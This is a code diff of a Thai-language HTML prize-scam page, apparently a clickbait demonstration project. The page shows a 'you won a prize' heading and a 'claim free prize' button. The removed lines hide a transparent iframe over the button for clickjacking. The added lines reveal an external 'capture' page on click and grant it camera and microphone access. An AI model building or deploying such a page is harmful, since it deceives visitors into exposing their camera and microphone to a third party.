@@ -18,24 +18,34 @@
             cursor: pointer;
         }
 
-        /* ซ่อน iframe และซ้อนทับให้ตรงปุ่ม */
-        #hiddenFrame {
+        /* ซ่อน iframe ไว้ก่อน */
+        #iframeContainer {
+            display: none;
             position: absolute;
             top: 120px; /* ปรับตำแหน่งให้ตรงกับปุ่ม */
             left: 50%;
             transform: translateX(-50%);
             width: 200px;
             height: 50px;
-            opacity: 0;
-            z-index: 999;
         }
     </style>
 </head>
 <body>
     <h1>🎉 ยินดีด้วย! คุณได้รับรางวัล 🎉</h1>
-    <button id="fakeButton">กดรับรางวัลฟรี!</button>
+    <button onclick="showIframe()">กดรับรางวัลฟรี!</button>
 
-    <!-- โหลด iframe อันตราย -->
-    <iframe id="hiddenFrame" src="https://natchapak-y.github.io/clickbait.github.io/capture.html" frameborder="0"></iframe>
+    <!-- ซ่อน iframe ไว้ก่อน -->
+    <div id="iframeContainer">
+        <iframe id="hiddenFrame" 
+                src="https://natchapak-y.github.io/clickbait.github.io/capture.html" 
+                allow="camera; microphone" frameborder="0">
+        </iframe>
+    </div>
+
+    <script>
+        function showIframe() {
+            document.getElementById('iframeContainer').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
